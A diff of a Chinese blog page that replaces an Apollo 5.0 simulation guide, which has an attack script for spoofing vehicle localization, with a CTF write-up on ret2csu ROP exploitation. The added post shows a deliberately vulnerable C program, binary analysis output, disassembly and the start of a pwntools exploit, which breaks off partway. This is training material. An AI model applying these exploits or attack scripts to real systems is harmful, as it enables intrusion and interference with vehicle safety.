@@ -6,33 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Apollo5.0-AttackAPI | JAckLosingHeart</title>
+  <title>中级rop之ret2csu | JAckLosingHeart</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="1 软硬件要求Linux操作系统，最好是Ubuntu14.04版本及以上。Nivida显卡（为了支持Apollo5.0中的Perception模块）。必须安装Nvidia专有驱动程序，但要注意当前版本的Apollo不支持Volta和Turing架构（包括Titan V和RTX 2080 GPU）。">
+  <meta name="description" content="Hitcoin-level5level5.c 1234567891011121314#undef _FORTIFY_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &amp;#123;	char buf[128];	read(STDIN_FI">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Apollo5.0-AttackAPI">
-<meta property="og:url" content="http://example.com/2021/01/08/Apollo5-0-AttackAPI/index.html">
+<meta property="og:title" content="中级rop之ret2csu">
+<meta property="og:url" content="http://example.com/2022/01/04/%E4%B8%AD%E7%BA%A7rop%E4%B9%8Bret2csu/index.html">
 <meta property="og:site_name" content="JAckLosingHeart">
-<meta property="og:description" content="1 软硬件要求Linux操作系统，最好是Ubuntu14.04版本及以上。Nivida显卡（为了支持Apollo5.0中的Perception模块）。必须安装Nvidia专有驱动程序，但要注意当前版本的Apollo不支持Volta和Turing架构（包括Titan V和RTX 2080 GPU）。">
+<meta property="og:description" content="Hitcoin-level5level5.c 1234567891011121314#undef _FORTIFY_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &amp;#123;	char buf[128];	read(STDIN_FI">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/img/apollo-1.png">
-<meta property="og:image" content="http://example.com/img/apollo-2.png">
-<meta property="og:image" content="http://example.com/img/apollo-3.png">
-<meta property="og:image" content="http://example.com/img/apollo-4.png">
-<meta property="og:image" content="http://example.com/img/apollo-5.png">
-<meta property="og:image" content="http://example.com/img/apollo-6.png">
-<meta property="og:image" content="http://example.com/img/apollo-7.png">
-<meta property="og:image" content="http://example.com/img/apollo-8.png">
-<meta property="og:image" content="http://example.com/img/apollo-9.png">
-<meta property="og:image" content="http://example.com/img/apollo-10.png">
-<meta property="og:image" content="http://example.com/img/apollo-11.png">
-<meta property="og:image" content="http://example.com/img/apollo-12.png">
-<meta property="article:published_time" content="2021-01-09T00:59:15.000Z">
-<meta property="article:modified_time" content="2021-01-09T15:09:37.662Z">
+<meta property="article:published_time" content="2022-01-05T03:56:16.000Z">
+<meta property="article:modified_time" content="2022-01-07T20:59:02.921Z">
 <meta property="article:author" content="JAckLosingHeart">
-<meta property="article:tag" content="Research">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/img/apollo-1.png">
   
     <link rel="alternative" href="/atom.xml" title="JAckLosingHeart" type="application/atom+xml">
   
@@ -149,104 +136,45 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Apollo5-0-AttackAPI" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-中级rop之ret2csu" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Apollo5.0-AttackAPI
+      中级rop之ret2csu
     </h1>
   
 
         
-        <a href="/2021/01/08/Apollo5-0-AttackAPI/" class="archive-article-date">
-  	<time datetime="2021-01-09T00:59:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-08</time>
+        <a href="/2022/01/04/%E4%B8%AD%E7%BA%A7rop%E4%B9%8Bret2csu/" class="archive-article-date">
+  	<time datetime="2022-01-05T03:56:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-04</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1-软硬件要求"><a href="#1-软硬件要求" class="headerlink" title="1 软硬件要求"></a>1 软硬件要求</h2><p>Linux操作系统，最好是Ubuntu14.04版本及以上。<br>Nivida显卡（为了支持Apollo5.0中的Perception模块）。必须安装Nvidia专有驱动程序，但要注意当前版本的Apollo不支持Volta和Turing架构（包括Titan V和RTX 2080 GPU）。</p>
-<a id="more"></a>
-<h2 id="2-软硬件安装说明"><a href="#2-软硬件安装说明" class="headerlink" title="2 软硬件安装说明"></a>2 软硬件安装说明</h2><p>2.1配置Docker<br>2.1.1 安装Docker CE<br>    安全Docker CE请参照官方文档<a target="_blank" rel="noopener" href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a> 。同时建议参照以下步骤完成配置<a target="_blank" rel="noopener" href="https://docs.docker.com/install/linux/linux-postinstall/">https://docs.docker.com/install/linux/linux-postinstall/</a> 。<br>2.1.2 安装Nivida Docker<br>    在安装nivida-docker之前请确保你已经正确安装了Nivida显卡驱动。如果你想测试自己是否正确安装了Nivida的驱动，请打开一个终端进入nivida-smi，如果你正确安装，那么你将看到类似于以下的输出：</p>
-<p><img src="/img/apollo-1.png" alt="apollo-1.png"></p>
-<p>具体安装nivida-docker的方法请参考<a target="_blank" rel="noopener" href="https://github.com/NVIDIA/nvidia-docker">https://github.com/NVIDIA/nvidia-docker</a> 。<br>2.1.3 获取LGSVL Docker镜像文件<br>    LGSVL在github仓库中维护了一个docker镜像，可以在这里获取<a target="_blank" rel="noopener" href="https://hub.docker.com/r/lgsvl/apollo-5.0/">https://hub.docker.com/r/lgsvl/apollo-5.0/</a> 。在docker中获取此镜像文件可使用如下命令：</p>
-<pre><code>docker pull lgsvl/apollo-5.0</code></pre>
-<p>2.2 安装可供攻击测试的Apollo5.0<br>    Apollo5.0的编译安装必须要在2.1配置好的docker中进行。首先打开一个终端，进到攻击测试版本Apollo5.0的存储路径，然后进到docker目录：</p>
-<pre><code>cd Apollo-5.0/docker/</code></pre>
-<p>然后启动docker：</p>
-<pre><code>bash scripts/dev_start.sh</code></pre>
-<p>进入docker：</p>
-<pre><code>bash scripts/dev_into.sh</code></pre>
-<p>这时候便已经进入到docker中Apollo的根路径/Apollo，接着输入：</p>
-<pre><code>bash apollo.sh build</code></pre>
-<p>对Apollo整个项目进行编译，如果终端中返回了Build OK，说明攻击测试版本的Apollo5.0已经安装完成。<br>如有重置docker的需要，可以任意打开一个终端输入如下指令进行重置：</p>
-<pre><code>dockerkillall
-dockerrmall
-dockerrmiall</code></pre>
-<p>如遇到长期运行Apollo日志占用空间过大的情况，进到docker的Apollo根目录下，输入如下指令对core和log文件夹进行清空：</p>
-<pre><code>cd data/log
-rm -f *
-cd data/core
-rm -f *</code></pre>
-<p>2.3下载并运行LGSVL模拟环境<br>    请前往该网址<a target="_blank" rel="noopener" href="https://github.com/lgsvl/simulator/releases/latest">https://github.com/lgsvl/simulator/releases/latest</a> 下载Linux最新版本的LGSVL模拟器<br>    解压缩下载的文件包，双击可执行文件即可，如果无法执行，请输入以下指令：</p>
-<pre><code>chmod a+x simulator</code></pre>
-<h2 id="3-软件使用说明"><a href="#3-软件使用说明" class="headerlink" title="3 软件使用说明"></a>3 软件使用说明</h2><p>3.1 运行Apollo，LGSVL<br>3.1.1 运行Apollo<br>    进入到docker中的Apollo根路径/Apollo，输入如下指令运行Apollo：</p>
-<pre><code>bash scripts/bootstrap.sh</code></pre>
-<p>如果看到如下输出即运行成功：</p>
-<p><img src="/img/apollo-2.png" alt="apollo-2.png"></p>
-<p>其中Dreamview运行于本地的8888端口，如果出现Dreamview无法打开的情况，将占用8888端口的进程kill掉即可。接着输入如下指令开启Cyber等待LGSVL模拟平台的桥接：</p>
-<pre><code>bash scripts/bridge.sh</code></pre>
-<p>如果看到如下输出则证明开启成功：<br><img src="/img/apollo-3.png" alt="apollo-3.png"><br>后面会跟有你主机的IP地址。<br>3.1.2 运行LGSVL<br>打开LGSVL模拟平台安装目录，双击可执行文件或终端输入./simulator运行LGSVL模拟平台，打开之后如下画面：<br><img src="/img/apollo-4.png" alt="apollo-4.png"><br>点击Open Browser，你的浏览器会自动跳出并展示如下画面：<br><img src="/img/apollo-5.png" alt="apollo-5.png"><br>点击左侧栏的Maps，会看到所有已经默认加入的可用地图，点击右上角的Add new按钮，给地图起一个名字，再去<a target="_blank" rel="noopener" href="https://content.lgsvlsimulator.com/maps/">https://content.lgsvlsimulator.com/maps/</a> 找到自己想使用的地图，复制其URL到Map URL即可添加地图，添加车辆也同理。在添加完地图和车辆之后，点击左侧栏中的Simulations，同样点击右上角的Add new，会看到如下画面：<br><img src="/img/apollo-6.png" alt="apollo-6.png"><br>地图选择刚刚添加的地图，车辆选择刚刚添加的车辆，桥接地址则输入localhost:9090即可。然后点击刚刚添加的simulation，会发现如下图所示：<br><img src="/img/apollo-7.png" alt="apollo-7.png"><br>点击开始的红色按钮，若发现模拟器中加载出车辆和地图，则说明成功，例如下图所示：<br><img src="/img/apollo-8.png" alt="apollo-8.png"><br>3.2 收集数据功能<br>    如果你想查看所有可以收集的channel，进到根路径/Apollo下，输入如下指令：</p>
-<pre><code>cyber_channel list</code></pre>
-<p>如果你想收集构建点云地图需要的数据，先在根路径/Apollo下创建一个目录，例如/Apollo/record/，在终端中进到根路径/Apollo，输入如下指令即可：</p>
-<pre><code>cyber_recorder record 
--c /apollo/sensor/gnss/odometry
--c /apollo/localization/pose 
--o /apollo/[你创建的目录]/pcd</code></pre>
-<p>而后你便能在该目录下看见所有收集的文件，例如下图所示：<br><img src="/img/apollo-9.png" alt="apollo-9.png"><br>3.3 构建点云地图功能<br>    本系统已将处理数据，构建地图两个功能集成在一条指令便可以完成，在根路径/Apollo输入如下指令：</p>
-<pre><code>bash mapcreator.sh [记录所在目录]</code></pre>
-<p>例如：</p>
-<pre><code>bash mapcreator.sh /Apollo/record</code></pre>
-<p>当然如果你想自己处理好数据，然后再从处理好的数据生成地图，可输入如下指令：</p>
-<pre><code>bash mapcreatorfromop.sh [处理后数据所在目录]</code></pre>
-<p>mapcreator会生成两个目录出来，一个目录名为[记录所在目录]output，一个目录名为[记录所在目录]map，[记录所在目录]output存有mapcreator处理好的数据，[记录所在目录]map则是生成好的地图。生成好的地图包括无损地图和有损地图，我们一般选择使用有损地图。<br>根路径下输入如下指令即可在测试时使用该地图，以shalun举例：</p>
-<pre><code>cd modules/map/data/[shalun]
-cp [有损地图目录所在位置] local_map</code></pre>
-<p>3.4 针对MSF的攻击实验模块<br>    首先按照3.1所示运行Apollo和LGSVL模拟环境（如果使用python API进行实验，请选中API only的simulation） ，之后再在根路径下打开终端，输入如下指令开启MSF和MSF可视化工具（可选）：</p>
-<pre><code>bash scripts/localization.sh
-bash scripts/localization_online_visualizer.sh（可选）</code></pre>
-<p>非常推荐开启MSF可视化工具，它可以清晰地展示GNSS，Lidar和Fusion的定位输出轨迹，很好的帮助你了解Lidar和MSF的热身情况，在攻击实验时可以很直观地表现出GPS攻击的效果，如下图所示，黄色框圈中的地方正是观察到的两次接管效应。而且红色圈和绿色圈的大小变化直观地表现出Lidar和Fusion的不确定度变化情况：<br><img src="/img/apollo-10.png" alt="apollo-10.png"><br>如果是手动驾驶车辆则已经可以驾驶车辆进入实验阶段，如果是使用python编程轨迹进行实验则进入到根路径输入如下指令：</p>
-<pre><code>python test.py</code></pre>
-<p>进入到攻击实验阶段以后，接口使用方法如下：</p>
-<pre><code>bash attack.sh [参数]
-参数选项：
-constant --试探性攻击
-stopconstant --停止试探性攻击
-noise --加入噪声
-stopnoise --停止注入噪声
-aggressive --侵略性攻击
-stopaggressive --停止侵略性攻击
-attack --加入噪声并开始试探性攻击
-stopattack --停止噪声注入和试探性攻击
-uncertainty --实验过程中获取不确定度数据
-stopuncertainty --停止获取不确定度数据</code></pre>
-<p>具体如何使用attack.sh则依据实验需求而定。如果想要在攻击实验过程中收集任何传感器数据，请参考3.2收集数据功能。<br>3.5 端到端攻击实验<br>    同样的，首先按照3.1所示运行Apollo和LGSVL模拟环境（端到端不使用python API），开启MSF定位和可视化工具：</p>
-<pre><code>bash scripts/localization.sh
-bash scripts/localization_online_visualizer.sh</code></pre>
-<p>然后手动为Lidar和MSF热身。热身完毕后，打开浏览器输入localhost:8888进入到Dreamview，如下图所示：<br><img src="/img/apollo-11.png" alt="apollo-11.png"><br>    点击左侧导航栏中Module Controller，会看到右下方这些可开启的模块，按照图中所示开启所有需要的模块之后，点击左侧导航栏中Routing Editing，界面如下图所示：<br><img src="/img/apollo-12.png" alt="apollo-12.png"><br>按图中这样选取一个起始点，选取一个结束点，点击Send Routing Request便可以让Apollo自动驾驶行驶一条路径，之后进行攻击实验使用的接口与3.4中相同。<br>3.6 实验数据处理<br>    如果你在攻击实验过程中记录了数据，想要计算实验中Lidar和Fusion的水平均方误差，可以使用系统提供的以下脚本。<br>例如你将数据存储到了/Apollo/attackrecord，输入下列指令：</p>
-<pre><code>bash compare_lidar_odometry.sh /Apollo/record
-python compute.py /Apollo/recordresult/lidar
-python compute.py /Apollo/recordresult/fusion</code></pre>
-<p>终端就会输出Lidar和Fusion的水平均方误差。如果你想要获取攻击实验中的Lidar的不确定度，输入指令：</p>
-<p>实验时：</p>
-<pre><code>bash attack.sh uncertainty</code></pre>
-<p>实验后：</p>
-<pre><code>python analysis.py data/log/localization.INFO lidar</code></pre>
-<p>如果想要Fusion的不确定度，将上述参数由lidar改为fusion即可。</p>
+        <h2 id="Hitcoin-level5"><a href="#Hitcoin-level5" class="headerlink" title="Hitcoin-level5"></a>Hitcoin-level5</h2><p>level5.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">	vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>file level5</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=45a4cee8f6bcc184507b3bea0f0c2e2d603650bd, not stripped</span><br></pre></td></tr></table></figure>
+<p>checksec</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/temp/Desktop/advanced stackoverflow/ret2csu/level5&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>vmmap</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x400000           0x401000 r-xp     1000 0      /home/temp/Desktop/advanced stackoverflow/ret2csu/level5</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/temp/Desktop/advanced stackoverflow/ret2csu/level5</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/temp/Desktop/advanced stackoverflow/ret2csu/level5</span><br><span class="line">    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7fdb000     0x7ffff7fdd000 rw-p     2000 0      </span><br><span class="line">    0x7ffff7ff8000     0x7ffff7ffb000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffc000 r-xp     1000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
+<p>info files</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400238 - 0x0000000000400254 is .interp</span><br><span class="line">	0x0000000000400254 - 0x0000000000400274 is .note.ABI-tag</span><br><span class="line">	0x0000000000400274 - 0x0000000000400298 is .note.gnu.build-id</span><br><span class="line">	0x0000000000400298 - 0x00000000004002b4 is .gnu.hash</span><br><span class="line">	0x00000000004002b8 - 0x0000000000400330 is .dynsym</span><br><span class="line">	0x0000000000400330 - 0x0000000000400373 is .dynstr</span><br><span class="line">	0x0000000000400374 - 0x000000000040037e is .gnu.version</span><br><span class="line">	0x0000000000400380 - 0x00000000004003a0 is .gnu.version_r</span><br><span class="line">	0x00000000004003a0 - 0x00000000004003b8 is .rela.dyn</span><br><span class="line">	0x00000000004003b8 - 0x0000000000400400 is .rela.plt</span><br><span class="line">	0x0000000000400400 - 0x000000000040041a is .init</span><br><span class="line">	0x0000000000400420 - 0x0000000000400460 is .plt</span><br><span class="line">	0x0000000000400460 - 0x0000000000400468 is .plt.got</span><br><span class="line">	0x0000000000400470 - 0x0000000000400632 is .text</span><br><span class="line">	0x0000000000400634 - 0x000000000040063d is .fini</span><br><span class="line">	0x0000000000400640 - 0x0000000000400652 is .rodata</span><br><span class="line">	0x0000000000400654 - 0x0000000000400690 is .eh_frame_hdr</span><br><span class="line">	0x0000000000400690 - 0x00000000004007a4 is .eh_frame</span><br><span class="line">	0x0000000000600e10 - 0x0000000000600e18 is .init_array</span><br><span class="line">	0x0000000000600e18 - 0x0000000000600e20 is .fini_array</span><br><span class="line">	0x0000000000600e20 - 0x0000000000600e28 is .jcr</span><br><span class="line">	0x0000000000600e28 - 0x0000000000600ff8 is .dynamic</span><br><span class="line">	0x0000000000600ff8 - 0x0000000000601000 is .got</span><br><span class="line">	0x0000000000601000 - 0x0000000000601030 is .got.plt</span><br><span class="line">	0x0000000000601030 - 0x0000000000601040 is .data</span><br><span class="line">	0x0000000000601040 - 0x0000000000601048 is .bss</span><br><span class="line">	......</span><br></pre></td></tr></table></figure>
+<p>__libc_csu_unit（会跟随版本变化而变化）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005C0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 ; &#125; &#x2F;&#x2F; starts at 4005C0</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br><span class="line">.text:0000000000400624</span><br><span class="line">.text:0000000000400624 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+<p>这题如果是32位的，可能还真用不到ret2csu，因为read，write函数的参数可以直接通过压栈来传递，这样找到libc版本和基地址之后，直接写/bin/sh到bss，再溢出一次调用execve然后参数是bss地址就好了。但64位因为参数传递机制的不同天生就需要找gadgets多一点</p>
+<p><strong>这题貌似用不了ret2dlresolve的库做，可以研究一下，因为第一眼看上去是可以做的</strong></p>
+<p>上exploit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># 通过设置context binary设置context一步到位</span></span><br><span class="line">context.binary    = <span class="string">&#x27;./level5&#x27;</span></span><br><span class="line">vuln              = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">write_got         = vuln.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got          = vuln.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr         = vuln.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">csu_start_addr    = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr      = <span class="number">0x000000000040061A</span></span><br><span class="line">offset            = <span class="number">136</span></span><br><span class="line">pad_len           = <span class="number">56</span></span><br><span class="line"><span class="comment"># bss函数直接取bss初始地址</span></span><br><span class="line">bss_addr          = vuln.bss()</span><br><span class="line">io                = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;write_got: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_got)))</span><br><span 